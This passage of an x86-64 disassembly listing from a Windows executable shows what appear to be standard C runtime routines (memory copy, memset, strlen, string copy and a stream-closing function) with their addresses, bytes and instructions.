   14000262f:	4d 8b c8             	mov    %r8,%r9
   140002632:	49 c1 e9 03          	shr    $0x3,%r9
   140002636:	74 14                	je     0x14000264c
   140002638:	48 83 e9 08          	sub    $0x8,%rcx
   14000263c:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140002640:	49 ff c9             	dec    %r9
   140002643:	48 89 01             	mov    %rax,(%rcx)
   140002646:	75 f0                	jne    0x140002638
   140002648:	49 83 e0 07          	and    $0x7,%r8
   14000264c:	4d 85 c0             	test   %r8,%r8
   14000264f:	75 0f                	jne    0x140002660
   140002651:	49 8b c3             	mov    %r11,%rax
   140002654:	c3                   	ret
   140002655:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000265c:	00 00 00 00 
   140002660:	49 2b c8             	sub    %r8,%rcx
   140002663:	4c 8b d1             	mov    %rcx,%r10
   140002666:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
   14000266a:	e9 7d fc ff ff       	jmp    0x1400022ec
   14000266f:	90                   	nop
   140002670:	48 8b 44 0a f8       	mov    -0x8(%rdx,%rcx,1),%rax
   140002675:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   14000267a:	48 83 e9 20          	sub    $0x20,%rcx
   14000267e:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140002682:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   140002686:	48 8b 44 0a 08       	mov    0x8(%rdx,%rcx,1),%rax
   14000268b:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   14000268f:	49 ff c9             	dec    %r9
   140002692:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002696:	4c 89 11             	mov    %r10,(%rcx)
   140002699:	75 d5                	jne    0x140002670
   14000269b:	49 83 e0 1f          	and    $0x1f,%r8
   14000269f:	eb 8e                	jmp    0x14000262f
   1400026a1:	49 83 f8 20          	cmp    $0x20,%r8
   1400026a5:	0f 86 05 ff ff ff    	jbe    0x1400025b0
   1400026ab:	49 03 c8             	add    %r8,%rcx
   1400026ae:	f6 c1 0f             	test   $0xf,%cl
   1400026b1:	75 0e                	jne    0x1400026c1
   1400026b3:	48 83 e9 10          	sub    $0x10,%rcx
   1400026b7:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   1400026bb:	49 83 e8 10          	sub    $0x10,%r8
   1400026bf:	eb 1b                	jmp    0x1400026dc
   1400026c1:	48 83 e9 10          	sub    $0x10,%rcx
   1400026c5:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   1400026c9:	48 8b c1             	mov    %rcx,%rax
   1400026cc:	80 e1 f0             	and    $0xf0,%cl
   1400026cf:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   1400026d3:	0f 11 08             	movups %xmm1,(%rax)
   1400026d6:	4c 8b c1             	mov    %rcx,%r8
   1400026d9:	4d 2b c3             	sub    %r11,%r8
   1400026dc:	4d 8b c8             	mov    %r8,%r9
   1400026df:	49 c1 e9 07          	shr    $0x7,%r9
   1400026e3:	74 68                	je     0x14000274d
   1400026e5:	0f 29 01             	movaps %xmm0,(%rcx)
   1400026e8:	eb 0d                	jmp    0x1400026f7
   1400026ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400026f0:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1400026f4:	0f 29 09             	movaps %xmm1,(%rcx)
   1400026f7:	0f 10 44 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm0
   1400026fc:	0f 10 4c 0a e0       	movups -0x20(%rdx,%rcx,1),%xmm1
   140002701:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140002708:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000270c:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   140002710:	0f 10 44 0a 50       	movups 0x50(%rdx,%rcx,1),%xmm0
   140002715:	0f 10 4c 0a 40       	movups 0x40(%rdx,%rcx,1),%xmm1
   14000271a:	49 ff c9             	dec    %r9
   14000271d:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   140002721:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   140002725:	0f 10 44 0a 30       	movups 0x30(%rdx,%rcx,1),%xmm0
   14000272a:	0f 10 4c 0a 20       	movups 0x20(%rdx,%rcx,1),%xmm1
   14000272f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   140002733:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   140002737:	0f 10 44 0a 10       	movups 0x10(%rdx,%rcx,1),%xmm0
   14000273c:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   140002740:	75 ae                	jne    0x1400026f0
   140002742:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   140002746:	49 83 e0 7f          	and    $0x7f,%r8
   14000274a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000274d:	4d 8b c8             	mov    %r8,%r9
   140002750:	49 c1 e9 04          	shr    $0x4,%r9
   140002754:	74 1a                	je     0x140002770
   140002756:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000275d:	00 00 00 
   140002760:	0f 29 01             	movaps %xmm0,(%rcx)
   140002763:	48 83 e9 10          	sub    $0x10,%rcx
   140002767:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000276b:	49 ff c9             	dec    %r9
   14000276e:	75 f0                	jne    0x140002760
   140002770:	49 83 e0 0f          	and    $0xf,%r8
   140002774:	74 08                	je     0x14000277e
   140002776:	41 0f 10 0a          	movups (%r10),%xmm1
   14000277a:	41 0f 11 0b          	movups %xmm1,(%r11)
   14000277e:	0f 29 01             	movaps %xmm0,(%rcx)
   140002781:	49 8b c3             	mov    %r11,%rax
   140002784:	c3                   	ret
   140002785:	cc                   	int3
   140002786:	cc                   	int3
   140002787:	cc                   	int3
   140002788:	cc                   	int3
   140002789:	cc                   	int3
   14000278a:	cc                   	int3
   14000278b:	cc                   	int3
   14000278c:	cc                   	int3
   14000278d:	cc                   	int3
   14000278e:	cc                   	int3
   14000278f:	cc                   	int3
   140002790:	cc                   	int3
   140002791:	cc                   	int3
   140002792:	cc                   	int3
   140002793:	cc                   	int3
   140002794:	cc                   	int3
   140002795:	cc                   	int3
   140002796:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000279d:	00 00 00 
   1400027a0:	4c 8b d9             	mov    %rcx,%r11
   1400027a3:	0f b6 d2             	movzbl %dl,%edx
   1400027a6:	49 83 f8 10          	cmp    $0x10,%r8
   1400027aa:	0f 82 5c 01 00 00    	jb     0x14000290c
   1400027b0:	0f ba 25 30 87 01 00 	btl    $0x1,0x18730(%rip)        # 0x14001aee8
   1400027b7:	01 
   1400027b8:	73 0e                	jae    0x1400027c8
   1400027ba:	57                   	push   %rdi
   1400027bb:	48 8b f9             	mov    %rcx,%rdi
   1400027be:	8b c2                	mov    %edx,%eax
   1400027c0:	49 8b c8             	mov    %r8,%rcx
   1400027c3:	f3 aa                	rep stos %al,(%rdi)
   1400027c5:	5f                   	pop    %rdi
   1400027c6:	eb 6d                	jmp    0x140002835
   1400027c8:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   1400027cf:	01 01 01 
   1400027d2:	49 0f af d1          	imul   %r9,%rdx
   1400027d6:	0f ba 25 0a 87 01 00 	btl    $0x2,0x1870a(%rip)        # 0x14001aee8
   1400027dd:	02 
   1400027de:	0f 82 9c 00 00 00    	jb     0x140002880
   1400027e4:	49 83 f8 40          	cmp    $0x40,%r8
   1400027e8:	72 1e                	jb     0x140002808
   1400027ea:	48 f7 d9             	neg    %rcx
   1400027ed:	83 e1 07             	and    $0x7,%ecx
   1400027f0:	74 06                	je     0x1400027f8
   1400027f2:	4c 2b c1             	sub    %rcx,%r8
   1400027f5:	49 89 13             	mov    %rdx,(%r11)
   1400027f8:	49 03 cb             	add    %r11,%rcx
   1400027fb:	4d 8b c8             	mov    %r8,%r9
   1400027fe:	49 83 e0 3f          	and    $0x3f,%r8
   140002802:	49 c1 e9 06          	shr    $0x6,%r9
   140002806:	75 3f                	jne    0x140002847
   140002808:	4d 8b c8             	mov    %r8,%r9
   14000280b:	49 83 e0 07          	and    $0x7,%r8
   14000280f:	49 c1 e9 03          	shr    $0x3,%r9
   140002813:	74 11                	je     0x140002826
   140002815:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002819:	90                   	nop
   14000281a:	48 89 11             	mov    %rdx,(%rcx)
   14000281d:	48 83 c1 08          	add    $0x8,%rcx
   140002821:	49 ff c9             	dec    %r9
   140002824:	75 f4                	jne    0x14000281a
   140002826:	4d 85 c0             	test   %r8,%r8
   140002829:	74 0a                	je     0x140002835
   14000282b:	88 11                	mov    %dl,(%rcx)
   14000282d:	48 ff c1             	inc    %rcx
   140002830:	49 ff c8             	dec    %r8
   140002833:	75 f6                	jne    0x14000282b
   140002835:	49 8b c3             	mov    %r11,%rax
   140002838:	c3                   	ret
   140002839:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002840:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002844:	66 66 90             	data16 xchg %ax,%ax
   140002847:	48 89 11             	mov    %rdx,(%rcx)
   14000284a:	48 89 51 08          	mov    %rdx,0x8(%rcx)
   14000284e:	48 89 51 10          	mov    %rdx,0x10(%rcx)
   140002852:	48 83 c1 40          	add    $0x40,%rcx
   140002856:	48 89 51 d8          	mov    %rdx,-0x28(%rcx)
   14000285a:	48 89 51 e0          	mov    %rdx,-0x20(%rcx)
   14000285e:	49 ff c9             	dec    %r9
   140002861:	48 89 51 e8          	mov    %rdx,-0x18(%rcx)
   140002865:	48 89 51 f0          	mov    %rdx,-0x10(%rcx)
   140002869:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   14000286d:	75 d8                	jne    0x140002847
   14000286f:	eb 97                	jmp    0x140002808
   140002871:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002878:	0f 1f 84 00 00 00 00 
   14000287f:	00 
   140002880:	66 48 0f 6e c2       	movq   %rdx,%xmm0
   140002885:	66 0f 60 c0          	punpcklbw %xmm0,%xmm0
   140002889:	f6 c1 0f             	test   $0xf,%cl
   14000288c:	74 16                	je     0x1400028a4
   14000288e:	0f 11 01             	movups %xmm0,(%rcx)
   140002891:	48 8b c1             	mov    %rcx,%rax
   140002894:	48 83 e0 0f          	and    $0xf,%rax
   140002898:	48 83 c1 10          	add    $0x10,%rcx
   14000289c:	48 2b c8             	sub    %rax,%rcx
   14000289f:	4e 8d 44 00 f0       	lea    -0x10(%rax,%r8,1),%r8
   1400028a4:	4d 8b c8             	mov    %r8,%r9
   1400028a7:	49 c1 e9 07          	shr    $0x7,%r9
   1400028ab:	74 32                	je     0x1400028df
   1400028ad:	eb 01                	jmp    0x1400028b0
   1400028af:	90                   	nop
   1400028b0:	0f 29 01             	movaps %xmm0,(%rcx)
   1400028b3:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   1400028b7:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400028be:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   1400028c2:	0f 29 41 b0          	movaps %xmm0,-0x50(%rcx)
   1400028c6:	49 ff c9             	dec    %r9
   1400028c9:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   1400028cd:	0f 29 41 d0          	movaps %xmm0,-0x30(%rcx)
   1400028d1:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   1400028d5:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   1400028d9:	75 d5                	jne    0x1400028b0
   1400028db:	49 83 e0 7f          	and    $0x7f,%r8
   1400028df:	4d 8b c8             	mov    %r8,%r9
   1400028e2:	49 c1 e9 04          	shr    $0x4,%r9
   1400028e6:	74 14                	je     0x1400028fc
   1400028e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400028ef:	00 
   1400028f0:	0f 29 01             	movaps %xmm0,(%rcx)
   1400028f3:	48 83 c1 10          	add    $0x10,%rcx
   1400028f7:	49 ff c9             	dec    %r9
   1400028fa:	75 f4                	jne    0x1400028f0
   1400028fc:	49 83 e0 0f          	and    $0xf,%r8
   140002900:	74 06                	je     0x140002908
   140002902:	41 0f 11 44 08 f0    	movups %xmm0,-0x10(%r8,%rcx,1)
   140002908:	49 8b c3             	mov    %r11,%rax
   14000290b:	c3                   	ret
   14000290c:	49 b9 01 01 01 01 01 	movabs $0x101010101010101,%r9
   140002913:	01 01 01 
   140002916:	49 0f af d1          	imul   %r9,%rdx
   14000291a:	4c 8d 0d df d6 ff ff 	lea    -0x2921(%rip),%r9        # 0x140000000
   140002921:	43 8b 84 81 35 29 00 	mov    0x2935(%r9,%r8,4),%eax
   140002928:	00 
   140002929:	4c 03 c8             	add    %rax,%r9
   14000292c:	49 03 c8             	add    %r8,%rcx
   14000292f:	49 8b c3             	mov    %r11,%rax
   140002932:	41 ff e1             	jmp    *%r9
   140002935:	8e 29                	mov    (%rcx),%gs
   140002937:	00 00                	add    %al,(%rax)
   140002939:	8b 29                	mov    (%rcx),%ebp
   14000293b:	00 00                	add    %al,(%rax)
   14000293d:	9c                   	pushf
   14000293e:	29 00                	sub    %eax,(%rax)
   140002940:	00 87 29 00 00 b0    	add    %al,-0x4fffffd7(%rdi)
   140002946:	29 00                	sub    %eax,(%rax)
   140002948:	00 a5 29 00 00 99    	add    %ah,-0x66ffffd7(%rbp)
   14000294e:	29 00                	sub    %eax,(%rax)
   140002950:	00 84 29 00 00 c5 29 	add    %al,0x29c50000(%rcx,%rbp,1)
   140002957:	00 00                	add    %al,(%rax)
   140002959:	bd 29 00 00 b4       	mov    $0xb4000029,%ebp
   14000295e:	29 00                	sub    %eax,(%rax)
   140002960:	00 8f 29 00 00 ac    	add    %cl,-0x53ffffd7(%rdi)
   140002966:	29 00                	sub    %eax,(%rax)
   140002968:	00 a1 29 00 00 95    	add    %ah,-0x6affffd7(%rcx)
   14000296e:	29 00                	sub    %eax,(%rax)
   140002970:	00 80 29 00 00 66    	add    %al,0x66000029(%rax)
   140002976:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000297d:	00 00 00 
   140002980:	48 89 51 f1          	mov    %rdx,-0xf(%rcx)
   140002984:	89 51 f9             	mov    %edx,-0x7(%rcx)
   140002987:	66 89 51 fd          	mov    %dx,-0x3(%rcx)
   14000298b:	88 51 ff             	mov    %dl,-0x1(%rcx)
   14000298e:	c3                   	ret
   14000298f:	48 89 51 f5          	mov    %rdx,-0xb(%rcx)
   140002993:	eb f2                	jmp    0x140002987
   140002995:	48 89 51 f2          	mov    %rdx,-0xe(%rcx)
   140002999:	89 51 fa             	mov    %edx,-0x6(%rcx)
   14000299c:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   1400029a0:	c3                   	ret
   1400029a1:	48 89 51 f3          	mov    %rdx,-0xd(%rcx)
   1400029a5:	89 51 fb             	mov    %edx,-0x5(%rcx)
   1400029a8:	88 51 ff             	mov    %dl,-0x1(%rcx)
   1400029ab:	c3                   	ret
   1400029ac:	48 89 51 f4          	mov    %rdx,-0xc(%rcx)
   1400029b0:	89 51 fc             	mov    %edx,-0x4(%rcx)
   1400029b3:	c3                   	ret
   1400029b4:	48 89 51 f6          	mov    %rdx,-0xa(%rcx)
   1400029b8:	66 89 51 fe          	mov    %dx,-0x2(%rcx)
   1400029bc:	c3                   	ret
   1400029bd:	48 89 51 f7          	mov    %rdx,-0x9(%rcx)
   1400029c1:	88 51 ff             	mov    %dl,-0x1(%rcx)
   1400029c4:	c3                   	ret
   1400029c5:	48 89 51 f8          	mov    %rdx,-0x8(%rcx)
   1400029c9:	c3                   	ret
   1400029ca:	cc                   	int3
   1400029cb:	cc                   	int3
   1400029cc:	cc                   	int3
   1400029cd:	cc                   	int3
   1400029ce:	cc                   	int3
   1400029cf:	cc                   	int3
   1400029d0:	cc                   	int3
   1400029d1:	cc                   	int3
   1400029d2:	cc                   	int3
   1400029d3:	cc                   	int3
   1400029d4:	cc                   	int3
   1400029d5:	cc                   	int3
   1400029d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400029dd:	00 00 00 
   1400029e0:	4c 8b d9             	mov    %rcx,%r11
   1400029e3:	f6 c1 07             	test   $0x7,%cl
   1400029e6:	74 12                	je     0x1400029fa
   1400029e8:	8a 01                	mov    (%rcx),%al
   1400029ea:	84 c0                	test   %al,%al
   1400029ec:	0f 84 91 00 00 00    	je     0x140002a83
   1400029f2:	48 ff c1             	inc    %rcx
   1400029f5:	f6 c1 07             	test   $0x7,%cl
   1400029f8:	75 ee                	jne    0x1400029e8
   1400029fa:	48 8b 01             	mov    (%rcx),%rax
   1400029fd:	4c 8b d0             	mov    %rax,%r10
   140002a00:	49 b9 ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r9
   140002a07:	fe fe 7e 
   140002a0a:	4d 03 ca             	add    %r10,%r9
   140002a0d:	49 83 f2 ff          	xor    $0xffffffffffffffff,%r10
   140002a11:	4d 33 d1             	xor    %r9,%r10
   140002a14:	48 83 c1 08          	add    $0x8,%rcx
   140002a18:	49 b9 00 01 01 01 01 	movabs $0x8101010101010100,%r9
   140002a1f:	01 01 81 
   140002a22:	4d 85 d1             	test   %r10,%r9
   140002a25:	74 d3                	je     0x1400029fa
   140002a27:	48 83 e9 08          	sub    $0x8,%rcx
   140002a2b:	84 c0                	test   %al,%al
   140002a2d:	74 54                	je     0x140002a83
   140002a2f:	48 ff c1             	inc    %rcx
   140002a32:	84 e4                	test   %ah,%ah
   140002a34:	74 4d                	je     0x140002a83
   140002a36:	48 ff c1             	inc    %rcx
   140002a39:	48 c1 e8 10          	shr    $0x10,%rax
   140002a3d:	84 c0                	test   %al,%al
   140002a3f:	74 42                	je     0x140002a83
   140002a41:	48 ff c1             	inc    %rcx
   140002a44:	84 e4                	test   %ah,%ah
   140002a46:	74 3b                	je     0x140002a83
   140002a48:	48 ff c1             	inc    %rcx
   140002a4b:	48 c1 e8 10          	shr    $0x10,%rax
   140002a4f:	84 c0                	test   %al,%al
   140002a51:	74 30                	je     0x140002a83
   140002a53:	48 ff c1             	inc    %rcx
   140002a56:	84 e4                	test   %ah,%ah
   140002a58:	74 29                	je     0x140002a83
   140002a5a:	48 ff c1             	inc    %rcx
   140002a5d:	c1 e8 10             	shr    $0x10,%eax
   140002a60:	84 c0                	test   %al,%al
   140002a62:	74 1f                	je     0x140002a83
   140002a64:	48 ff c1             	inc    %rcx
   140002a67:	84 e4                	test   %ah,%ah
   140002a69:	74 18                	je     0x140002a83
   140002a6b:	48 ff c1             	inc    %rcx
   140002a6e:	eb 8a                	jmp    0x1400029fa
   140002a70:	cc                   	int3
   140002a71:	cc                   	int3
   140002a72:	cc                   	int3
   140002a73:	cc                   	int3
   140002a74:	cc                   	int3
   140002a75:	cc                   	int3
   140002a76:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002a7d:	00 00 00 
   140002a80:	4c 8b d9             	mov    %rcx,%r11
   140002a83:	48 2b ca             	sub    %rdx,%rcx
   140002a86:	f6 c2 07             	test   $0x7,%dl
   140002a89:	74 1f                	je     0x140002aaa
   140002a8b:	8a 02                	mov    (%rdx),%al
   140002a8d:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002a90:	84 c0                	test   %al,%al
   140002a92:	74 0a                	je     0x140002a9e
   140002a94:	48 ff c2             	inc    %rdx
   140002a97:	f6 c2 07             	test   $0x7,%dl
   140002a9a:	75 ef                	jne    0x140002a8b
   140002a9c:	eb 0c                	jmp    0x140002aaa
   140002a9e:	49 8b c3             	mov    %r11,%rax
   140002aa1:	c3                   	ret
   140002aa2:	48 89 04 11          	mov    %rax,(%rcx,%rdx,1)
   140002aa6:	48 83 c2 08          	add    $0x8,%rdx
   140002aaa:	48 8b 02             	mov    (%rdx),%rax
   140002aad:	49 b9 ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r9
   140002ab4:	fe fe 7e 
   140002ab7:	4c 03 c8             	add    %rax,%r9
   140002aba:	4c 8b d0             	mov    %rax,%r10
   140002abd:	49 83 f2 ff          	xor    $0xffffffffffffffff,%r10
   140002ac1:	4d 33 d1             	xor    %r9,%r10
   140002ac4:	49 b9 00 01 01 01 01 	movabs $0x8101010101010100,%r9
   140002acb:	01 01 81 
   140002ace:	4d 85 d1             	test   %r10,%r9
   140002ad1:	74 cf                	je     0x140002aa2
   140002ad3:	84 c0                	test   %al,%al
   140002ad5:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002ad8:	74 59                	je     0x140002b33
   140002ada:	48 ff c2             	inc    %rdx
   140002add:	84 e4                	test   %ah,%ah
   140002adf:	88 24 11             	mov    %ah,(%rcx,%rdx,1)
   140002ae2:	74 4f                	je     0x140002b33
   140002ae4:	48 ff c2             	inc    %rdx
   140002ae7:	48 c1 e8 10          	shr    $0x10,%rax
   140002aeb:	84 c0                	test   %al,%al
   140002aed:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002af0:	74 41                	je     0x140002b33
   140002af2:	48 ff c2             	inc    %rdx
   140002af5:	84 e4                	test   %ah,%ah
   140002af7:	88 24 11             	mov    %ah,(%rcx,%rdx,1)
   140002afa:	74 37                	je     0x140002b33
   140002afc:	48 ff c2             	inc    %rdx
   140002aff:	48 c1 e8 10          	shr    $0x10,%rax
   140002b03:	84 c0                	test   %al,%al
   140002b05:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002b08:	74 29                	je     0x140002b33
   140002b0a:	48 ff c2             	inc    %rdx
   140002b0d:	84 e4                	test   %ah,%ah
   140002b0f:	88 24 11             	mov    %ah,(%rcx,%rdx,1)
   140002b12:	74 1f                	je     0x140002b33
   140002b14:	48 ff c2             	inc    %rdx
   140002b17:	c1 e8 10             	shr    $0x10,%eax
   140002b1a:	84 c0                	test   %al,%al
   140002b1c:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002b1f:	74 12                	je     0x140002b33
   140002b21:	48 ff c2             	inc    %rdx
   140002b24:	84 e4                	test   %ah,%ah
   140002b26:	88 24 11             	mov    %ah,(%rcx,%rdx,1)
   140002b29:	74 08                	je     0x140002b33
   140002b2b:	48 ff c2             	inc    %rdx
   140002b2e:	e9 77 ff ff ff       	jmp    0x140002aaa
   140002b33:	49 8b c3             	mov    %r11,%rax
   140002b36:	c3                   	ret
   140002b37:	cc                   	int3
   140002b38:	cc                   	int3
   140002b39:	cc                   	int3
   140002b3a:	cc                   	int3
   140002b3b:	cc                   	int3
   140002b3c:	cc                   	int3
   140002b3d:	cc                   	int3
   140002b3e:	cc                   	int3
   140002b3f:	cc                   	int3
   140002b40:	cc                   	int3
   140002b41:	cc                   	int3
   140002b42:	cc                   	int3
   140002b43:	cc                   	int3
   140002b44:	cc                   	int3
   140002b45:	cc                   	int3
   140002b46:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002b4d:	00 00 00 
   140002b50:	48 8b c1             	mov    %rcx,%rax
   140002b53:	48 f7 d9             	neg    %rcx
   140002b56:	48 a9 07 00 00 00    	test   $0x7,%rax
   140002b5c:	74 0f                	je     0x140002b6d
   140002b5e:	66 90                	xchg   %ax,%ax
   140002b60:	8a 10                	mov    (%rax),%dl
   140002b62:	48 ff c0             	inc    %rax
   140002b65:	84 d2                	test   %dl,%dl
   140002b67:	74 5f                	je     0x140002bc8
   140002b69:	a8 07                	test   $0x7,%al
   140002b6b:	75 f3                	jne    0x140002b60
   140002b6d:	49 b8 ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r8
   140002b74:	fe fe 7e 
   140002b77:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   140002b7e:	01 01 81 
   140002b81:	48 8b 10             	mov    (%rax),%rdx
   140002b84:	4d 8b c8             	mov    %r8,%r9
   140002b87:	48 83 c0 08          	add    $0x8,%rax
   140002b8b:	4c 03 ca             	add    %rdx,%r9
   140002b8e:	48 f7 d2             	not    %rdx
   140002b91:	49 33 d1             	xor    %r9,%rdx
   140002b94:	49 23 d3             	and    %r11,%rdx
   140002b97:	74 e8                	je     0x140002b81
   140002b99:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140002b9d:	84 d2                	test   %dl,%dl
   140002b9f:	74 51                	je     0x140002bf2
   140002ba1:	84 f6                	test   %dh,%dh
   140002ba3:	74 47                	je     0x140002bec
   140002ba5:	48 c1 ea 10          	shr    $0x10,%rdx
   140002ba9:	84 d2                	test   %dl,%dl
   140002bab:	74 39                	je     0x140002be6
   140002bad:	84 f6                	test   %dh,%dh
   140002baf:	74 2f                	je     0x140002be0
   140002bb1:	48 c1 ea 10          	shr    $0x10,%rdx
   140002bb5:	84 d2                	test   %dl,%dl
   140002bb7:	74 21                	je     0x140002bda
   140002bb9:	84 f6                	test   %dh,%dh
   140002bbb:	74 17                	je     0x140002bd4
   140002bbd:	c1 ea 10             	shr    $0x10,%edx
   140002bc0:	84 d2                	test   %dl,%dl
   140002bc2:	74 0a                	je     0x140002bce
   140002bc4:	84 f6                	test   %dh,%dh
   140002bc6:	75 b9                	jne    0x140002b81
   140002bc8:	48 8d 44 01 ff       	lea    -0x1(%rcx,%rax,1),%rax
   140002bcd:	c3                   	ret
   140002bce:	48 8d 44 01 fe       	lea    -0x2(%rcx,%rax,1),%rax
   140002bd3:	c3                   	ret
   140002bd4:	48 8d 44 01 fd       	lea    -0x3(%rcx,%rax,1),%rax
   140002bd9:	c3                   	ret
   140002bda:	48 8d 44 01 fc       	lea    -0x4(%rcx,%rax,1),%rax
   140002bdf:	c3                   	ret
   140002be0:	48 8d 44 01 fb       	lea    -0x5(%rcx,%rax,1),%rax
   140002be5:	c3                   	ret
   140002be6:	48 8d 44 01 fa       	lea    -0x6(%rcx,%rax,1),%rax
   140002beb:	c3                   	ret
   140002bec:	48 8d 44 01 f9       	lea    -0x7(%rcx,%rax,1),%rax
   140002bf1:	c3                   	ret
   140002bf2:	48 8d 44 01 f8       	lea    -0x8(%rcx,%rax,1),%rax
   140002bf7:	c3                   	ret
   140002bf8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002bfd:	57                   	push   %rdi
   140002bfe:	48 83 ec 20          	sub    $0x20,%rsp
   140002c02:	83 cf ff             	or     $0xffffffff,%edi
   140002c05:	48 8b d9             	mov    %rcx,%rbx
   140002c08:	48 85 c9             	test   %rcx,%rcx
   140002c0b:	75 14                	jne    0x140002c21
   140002c0d:	e8 66 19 00 00       	call   0x140004578
   140002c12:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002c18:	e8 0b 15 00 00       	call   0x140004128
   140002c1d:	0b c7                	or     %edi,%eax
   140002c1f:	eb 46                	jmp    0x140002c67
   140002c21:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   140002c25:	74 3a                	je     0x140002c61
   140002c27:	e8 40 1a 00 00       	call   0x14000466c
   140002c2c:	48 8b cb             	mov    %rbx,%rcx
   140002c2f:	8b f8                	mov    %eax,%edi
   140002c31:	e8 b2 19 00 00       	call   0x1400045e8
   140002c36:	48 8b cb             	mov    %rbx,%rcx
   140002c39:	e8 46 15 00 00       	call   0x140004184
   140002c3e:	8b c8                	mov    %eax,%ecx
   140002c40:	e8 43 17 00 00       	call   0x140004388
   140002c45:	85 c0                	test   %eax,%eax
   140002c47:	79 05                	jns    0x140002c4e
   140002c49:	83 cf ff             	or     $0xffffffff,%edi
   140002c4c:	eb 13                	jmp    0x140002c61
   140002c4e:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140002c52:	48 85 c9             	test   %rcx,%rcx
   140002c55:	74 0a                	je     0x140002c61
   140002c57:	e8 38 0b 00 00       	call   0x140003794
   140002c5c:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   140002c61:	83 63 18 00          	andl   $0x0,0x18(%rbx)
   140002c65:	8b c7                	mov    %edi,%eax
   140002c67:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002c6c:	48 83 c4 20          	add    $0x20,%rsp
   140002c70:	5f                   	pop    %rdi
   140002c71:	c3                   	ret
   140002c72:	cc                   	int3
   140002c73:	cc                   	int3
   140002c74:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002c79:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002c7e:	57                   	push   %rdi
   140002c7f:	48 83 ec 20          	sub    $0x20,%rsp
   140002c83:	48 8b d9             	mov    %rcx,%rbx
   140002c86:	83 cf ff             	or     $0xffffffff,%edi
   140002c89:	33 c0                	xor    %eax,%eax
   140002c8b:	48 85 c9             	test   %rcx,%rcx
   140002c8e:	0f 95 c0             	setne  %al
   140002c91:	85 c0                	test   %eax,%eax
   140002c93:	75 14                	jne    0x140002ca9
   140002c95:	e8 de 18 00 00       	call   0x140004578
   140002c9a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002ca0:	e8 83 14 00 00       	call   0x140004128
   140002ca5:	8b c7                	mov    %edi,%eax
   140002ca7:	eb 26                	jmp    0x140002ccf
   140002ca9:	f6 41 18 40          	testb  $0x40,0x18(%rcx)
   140002cad:	74 06                	je     0x140002cb5
   140002caf:	83 61 18 00          	andl   $0x0,0x18(%rcx)
   140002cb3:	eb f0                	jmp    0x140002ca5
   140002cb5:	e8 c2 15 00 00       	call   0x14000427c
   140002cba:	90                   	nop
   140002cbb:	48 8b cb             	mov    %rbx,%rcx
   140002cbe:	e8 35 ff ff ff       	call   0x140002bf8
   140002cc3:	8b f8                	mov    %eax,%edi
